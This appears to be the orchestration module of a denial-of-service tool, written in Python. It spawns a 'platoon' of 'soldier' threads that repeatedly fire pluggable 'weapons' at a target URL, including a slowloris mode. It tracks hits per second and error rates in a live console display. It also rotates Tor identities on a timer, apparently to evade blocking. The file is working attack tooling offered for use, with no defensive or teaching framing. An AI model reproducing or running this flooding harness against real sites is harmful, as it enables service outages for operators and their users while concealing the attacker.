
import random
import threading
import time
from typing import Any, Optional, TYPE_CHECKING
import app.console
from app.net import RequestException
from app.models import AttackResult, AttackSummary

if TYPE_CHECKING:
    from app.tor import TorClient


class Monitor:
    """
    Attack status monitor, records analytics on the attack and maintains the statsu displayed in the status line
    """

    NUM_BUCKETS = 3  # 1 being counted, 1 being used by get_status() and 1 cleared ready for the next round
    BUCKET_SECS = 3  # number of seconds each hit bucket covers

    def __init__(self) -> None:

        # lock used when modifying the monitor state
        self._lock = threading.Lock()

        # monitor status / state

        self._last_http_status = 0
        self._start_time = 0

        self._hit_buckets = []
        self._hit_buckets_index = 0

        # cumulative tracking fields
        self._total_hits = 0
        self._total_bytes_sent = 0
        self._total_bytes_received = 0
        self._total_errors = 0
        self._total_requests = 0
        self._response_times = []
        self._http_status_counts = {}
        self._active_threads = 0
        self._active_sockets = 0

    def start(self) -> None:
        """
        Start monitoring. This will reset the internal state of the monitor so hits per sec
        will be calculated from now on.
        """

        self._lock.acquire()

        self._last_http_status = 200
        self._start_time = time.time()

        # initialise all of the hit buckets
        self._hit_buckets_index = 0
        self._hit_buckets = [0] * self.NUM_BUCKETS

        # reset cumulative tracking fields
        self._total_hits = 0
        self._total_bytes_sent = 0
        self._total_bytes_received = 0
        self._total_errors = 0
        self._total_requests = 0
        self._response_times = []
        self._http_status_counts = {}
        self._active_threads = 0
        self._active_sockets = 0

        self._lock.release()

    def report_attack_result(self, thread: Any, result: AttackResult) -> None:
        """
        Report an attack result from a soldier thread.
        :param thread: The ID of the soldier thread which is reporting the result
        :param result: AttackResult object containing comprehensive attack metrics
        """

        self._lock.acquire()

        if result.http_status is not None:
            self._last_http_status = result.http_status

        # update cumulative metrics
        self._total_hits += result.num_hits
        self._total_bytes_sent += result.bytes_sent
        self._total_bytes_received += result.bytes_received
        self._total_errors += result.errors
        self._total_requests += 1

        # track response time if available
        if result.response_time_ms is not None:
            self._response_times.append(result.response_time_ms)

        # track HTTP status counts
        if result.http_status is not None:
            self._http_status_counts[result.http_status] = self._http_status_counts.get(result.http_status, 0) + 1

        # update hit buckets for hits-per-second calculation
        hit_bucket_index = self._current_bucket()
        self._hit_buckets[hit_bucket_index] += result.num_hits

        # clear the next bucket, so they always restart at 0
        hit_bucket_index = (hit_bucket_index+1) % self.NUM_BUCKETS
        self._hit_buckets[hit_bucket_index] = 0

        self._lock.release()

    def get_status(self) -> tuple[int, float]:
        """
        Returns the monitor status.
        :return: tuple (last_http_status, hits_per_second)
        """

        # get hits from the previous hit bucket, while the current one is being populated
        hit_bucket_index = (self._current_bucket()-1) % self.NUM_BUCKETS
        num_hits = self._hit_buckets[hit_bucket_index]

        return (
            self._last_http_status,
            num_hits / self.BUCKET_SECS
        )

    def get_summary(self) -> AttackSummary:
        """
        Returns comprehensive attack summary statistics.
        :return: AttackSummary with all tracked metrics
        """

        self._lock.acquire()

        end_time = time.time()
        duration_seconds = end_time - self._start_time if self._start_time > 0 else 0

        hits_per_second = self._total_hits / duration_seconds if duration_seconds > 0 else 0.0

        # calculate response time statistics
        avg_response_time_ms = None
        min_response_time_ms = None
        max_response_time_ms = None
        if self._response_times:
            avg_response_time_ms = sum(self._response_times) / len(self._response_times)
            min_response_time_ms = min(self._response_times)
            max_response_time_ms = max(self._response_times)

        summary = AttackSummary(
            total_hits=self._total_hits,
            total_bytes_sent=self._total_bytes_sent,
            total_bytes_received=self._total_bytes_received,
            total_errors=self._total_errors,
            total_requests=self._total_requests,
            avg_response_time_ms=avg_response_time_ms,
            min_response_time_ms=min_response_time_ms,
            max_response_time_ms=max_response_time_ms,
            hits_per_second=hits_per_second,
            http_status_counts=self._http_status_counts.copy(),
            active_threads=self._active_threads,
            active_sockets=self._active_sockets,
            start_time=self._start_time,
            end_time=end_time,
            duration_seconds=duration_seconds if duration_seconds > 0 else None
        )

        self._lock.release()

        return summary

    def get_live_metrics(self) -> dict[str, Any]:
        """
        Returns detailed real-time metrics for live display.
        :return: Dictionary with current metrics
        """

        self._lock.acquire()

        # calculate response time statistics if available
        avg_response_time_ms = None
        min_response_time_ms = None
        max_response_time_ms = None
        if self._response_times:
            avg_response_time_ms = sum(self._response_times) / len(self._response_times)
            min_response_time_ms = min(self._response_times)
            max_response_time_ms = max(self._response_times)

        # get hits per second from current bucket
        hit_bucket_index = (self._current_bucket()-1) % self.NUM_BUCKETS
        num_hits = self._hit_buckets[hit_bucket_index]
        hits_per_second = num_hits / self.BUCKET_SECS

        elapsed_seconds = time.time() - self._start_time if self._start_time > 0 else 0.0

        metrics = {
            'total_hits': self._total_hits,
            'total_bytes_sent': self._total_bytes_sent,
            'total_bytes_received': self._total_bytes_received,
            'total_errors': self._total_errors,
            'total_requests': self._total_requests,
            'hits_per_second': hits_per_second,
            'last_http_status': self._last_http_status,
            'http_status_counts': self._http_status_counts.copy(),
            'active_threads': self._active_threads,
            'active_sockets': self._active_sockets,
            'avg_response_time_ms': avg_response_time_ms,
            'min_response_time_ms': min_response_time_ms,
            'max_response_time_ms': max_response_time_ms,
            'elapsed_seconds': elapsed_seconds,
        }

        self._lock.release()

        return metrics

    def _current_bucket(self) -> int:
        return int(time.time()/self.BUCKET_SECS) % self.NUM_BUCKETS

    def increment_active_threads(self) -> None:
        """Increment the active thread counter."""
        self._lock.acquire()
        self._active_threads += 1
        self._lock.release()

    def decrement_active_threads(self) -> None:
        """Decrement the active thread counter."""
        self._lock.acquire()
        self._active_threads -= 1
        self._lock.release()

    def increment_active_sockets(self, count: int = 1) -> None:
        """Increment the active socket counter."""
        self._lock.acquire()
        self._active_sockets += count
        self._lock.release()

    def decrement_active_sockets(self, count: int = 1) -> None:
        """Decrement the active socket counter."""
        self._lock.acquire()
        self._active_sockets -= count
        self._lock.release()


class IdentityRotator(threading.Thread):
    """Daemon thread that periodically rotates Tor identity at configurable intervals."""

    def __init__(self, tor_client: 'TorClient', interval: int = 300) -> None:
        """
        :param tor_client: TorClient instance for identity rotation
        :param interval: Rotation interval in seconds (default: 300 for 5 minutes)
        """

        threading.Thread.__init__(self)

        self._tor_client = tor_client
        self._interval = interval
        self._is_rotating = False
        self._stop_event = threading.Event()
        self.daemon = True

    def start_rotation(self) -> None:
        """Start the identity rotation thread."""
        self.start()

    def stop(self) -> None:
        """Signal the rotator thread to stop."""
        app.console.log("stopping identity rotator")
        self._is_rotating = False
        self._stop_event.set()

    def wait_done(self) -> None:
        """Wait for the rotator thread to finish. Calls join() if thread is alive."""
        if self.is_alive():
            self.join()

    def run(self) -> None:
        """Main rotation loop. Sleeps for interval, then rotates identity."""

        app.console.log("starting identity rotator (interval: %d seconds)" % self._interval)
        self._is_rotating = True

        while self._is_rotating:
            if self._stop_event.wait(self._interval):
                # Event was set (stop was called), exit immediately
                break

            try:
                self._tor_client.new_identity()
                app.console.log("identity rotated successfully")
            except Exception as ex:
                app.console.error("identity rotation failed: %s" % str(ex))

        app.console.log("identity rotator stopped")


class SoldierThread(threading.Thread):

    def __init__(self, tid: int, monitor: Monitor) -> None:
        """
        :param tid: The ID of the thread
        :param monitor: The monitor which the soldier thread should report to
        """

        threading.Thread.__init__(self)

        self._id = tid
        self._monitor = monitor

        self._target_url = ''
        self._weapon = None

        # whether the thread should be actively attacking
        self._is_attacking = False

    def attack(self, **kwargs: Any) -> None:
        """
        Start an attack on the given target. Will call the soldier threads start()
        :param target_url: The target URL to attack
        :param weapon: The app.weapons.Weapon instance to use in the attack
        """

        self._target_url = kwargs['target_url'] if 'target_url' in kwargs else None
        self._weapon = kwargs['weapon'] if 'weapon' in kwargs else None

        self._weapon.target(self._target_url, monitor=self._monitor)

        self._is_attacking = True
        self._monitor.increment_active_threads()
        self.start()

    def hold_fire(self) -> None:
        """
        Signal to the soldier thread to stop attacking. Will finish its last round then will stop.
        """

        app.console.log("stopping soldier thread #%d" % self._id)

        self._is_attacking = False

    def wait_done(self) -> None:
        """
        Wait for the soldier thread to finish its last round. Calls .join() on the soldier thread.
        """

        app.console.log("waiting for soldier thread #%d" % self._id)

        if self.is_alive():
            self.join()

    def run(self) -> None:

        app.console.log("starting soldier thread #%d" % self._id)

        try:
            while self._is_attacking:

                try:

                    result = self._weapon.attack()
                    self._monitor.report_attack_result(self, result)

                except RequestException as ex:

                    app.console.error(str(ex))

                    # create AttackResult with error info
                    error_result = AttackResult(
                        num_hits=0,
                        http_status=None,
                        bytes_sent=0,
                        bytes_received=0,
                        response_time_ms=None,
                        errors=1
                    )
                    self._monitor.report_attack_result(self, error_result)
        finally:
            self._monitor.decrement_active_threads()


class Platoon:
    """Platoon of soldier threads which run an attack."""

    def __init__(self, **kwargs: Any) -> None:
        """

        :param num_soldiers: The number of soldier threads to spawn
        :param tor_client: TorClient instance for identity rotation (optional)
        :param network_client: NetworkClient instance for HTTP requests (optional)
        :param identity_rotation_interval: Interval in seconds for identity rotation (optional)
        """

        self._num_soldiers = int(kwargs['num_soldiers']) if 'num_soldiers' in kwargs else 1
        self._tor_client = kwargs.get('tor_client', None)
        self._network_client = kwargs.get('network_client', None)
        self._identity_rotation_interval = kwargs.get('identity_rotation_interval', None)
        self._identity_rotator = None
        self._mode = kwargs.get('mode', 'singleshot')

        self._monitor = Monitor()

        # whether the platoon should be actively attacking
        self._is_attacking = False

        # spawn all of the soldier threads
        self._soldiers = []
        for soldier_id in range(0, self._num_soldiers):
            soldier = SoldierThread(soldier_id, self._monitor)
            self._soldiers.append(soldier)

    def attack(self, **kwargs: Any) -> None:
        """
        Start the attack. Will start up all of the soldier threads and give them a target
        :param target_url: The target URL/domain to be attacked
        :param weapon_factory: The weapon factory to use to spawn the weapons used by the soldier threads
        """

        target_url = kwargs['target_url'] if 'target_url' in kwargs else None
        weapon_factory = kwargs['weapon_factory'] if 'weapon_factory' in kwargs else None

        if target_url is None or weapon_factory is None:
            raise ValueError("target_url and weapon_factory are required")

        app.console.log("starting attack on %s" % target_url)

        self._is_attacking = True

        self._monitor.start()

        # start identity rotator if configured
        if self._tor_client is not None and self._identity_rotation_interval is not None:
            if self._identity_rotation_interval > 0:
                self._identity_rotator = IdentityRotator(self._tor_client, self._identity_rotation_interval)
                self._identity_rotator.start_rotation()
            else:
                app.console.log("skipping identity rotation: interval must be positive (got %d)" % self._identity_rotation_interval)

        # start each of the soldier threads attacking
        # will slowely ramp up the soldier threads over a number of seconds (i.e. wont create them all at once)
        for soldier in self._soldiers:

            if self._is_attacking:
                # NOTE we check is_attacking here, just incase the user hit ctrl-c during the startup process

                weapon = weapon_factory.make(network_client=self._network_client)

                soldier.attack(
                    target_url=target_url,
                    weapon=weapon
                )

                # introduce artifical delay between starting threads some where between 1-2 seconds
                # we use 11 as it is a prime numebr and will stagger the threads nicely
                delay = random.randint(0, 11) / 11 + 1.0
                time.sleep(delay)

        # reserve 7 lines for the status block
        for _ in range(7):
            app.console.log("")

        # update status block periodically
        while self._is_attacking:

            metrics = self._monitor.get_live_metrics()

            # format elapsed time as HH:MM:SS
            elapsed = int(metrics['elapsed_seconds'])
            hours = elapsed // 3600
            minutes = (elapsed % 3600) // 60
            seconds = elapsed % 60
            elapsed_str = f"Elapsed: {hours:02d}:{minutes:02d}:{seconds:02d}"

            # format bytes helper
            def format_bytes(b):
                if b >= 1024 * 1024:
                    return f"{b / (1024 * 1024):.1f} MB"
                elif b >= 1024:
                    return f"{b / 1024:.1f} KB"
                else:
                    return f"{b} B"

            # compute error rate
            total_requests = metrics['total_requests']
            total_errors = metrics['total_errors']
            error_rate = (total_errors / total_requests * 100) if total_requests > 0 else 0.0

            # format HTTP status counts
            if self._mode == 'slowloris':
                http_status_str = "HTTP status: N/A (slowloris)"
            else:
                status_counts = metrics['http_status_counts']
                if status_counts:
                    http_status_str = "HTTP status: " + ", ".join(f"{code} ({count})" for code, count in sorted(status_counts.items()))
                else:
                    http_status_str = "HTTP status: --"

            # format response times
            if self._mode == 'slowloris' or metrics['avg_response_time_ms'] is None:
                response_time_str = "Response time: N/A"
            else:
                avg = metrics['avg_response_time_ms']
                min_rt = metrics['min_response_time_ms']
                max_rt = metrics['max_response_time_ms']
                response_time_str = f"Response time: avg {avg:.0f}ms | min {min_rt:.0f}ms | max {max_rt:.0f}ms"

            # format active sockets line
            if self._mode == 'slowloris':
                sockets_str = f"Active threads: {metrics['active_threads']} | Active sockets: {metrics['active_sockets']}"
            else:
                sockets_str = f"Active threads: {metrics['active_threads']}"

            # build the 7 lines
            line1 = elapsed_str
            line2 = f"Throughput: {metrics['hits_per_second']:.2f} hits/sec | Total hits: {metrics['total_hits']}"
            line3 = f"Bytes sent: {format_bytes(metrics['total_bytes_sent'])} | Bytes received: {format_bytes(metrics['total_bytes_received'])}"
            line4 = f"Errors: {total_errors} ({error_rate:.1f}%) | Requests: {total_requests}"
            line5 = http_status_str
            line6 = response_time_str
            line7 = sockets_str

            lines = [line1, line2, line3, line4, line5, line6, line7]

            # determine if any line should be error (non-zero errors or non-2xx HTTP status)
            has_errors = total_errors > 0
            has_non_2xx = any(code < 200 or code >= 300 for code in metrics['http_status_counts'].keys())

            app.console.back(7)
            for i, line in enumerate(lines):
                # line 4 (errors) and line 5 (HTTP status) use error() if problematic
                if i == 3 and has_errors:
                    app.console.error(line)
                elif i == 4 and has_non_2xx:
                    app.console.error(line)
                else:
                    app.console.log(line)

            # repeat every second
            time.sleep(1.0)

        app.console.log("done")

    def hold_fire(self) -> None:
        """Stop the attack, tell all of the soldier threads to hold_fire()"""

        self._is_attacking = False

        # stop identity rotator if it exists
        if self._identity_rotator is not None:
            self._identity_rotator.stop()
            self._identity_rotator.wait_done()

        # first request all the soldiers to hold fire (and their weapons)
        for soldier in self._soldiers:
            if soldier._weapon is not None:
                soldier._weapon.hold_fire()
            soldier.hold_fire()

        # then wait for each of them to finish
        for soldier in self._soldiers:
            soldier.wait_done()
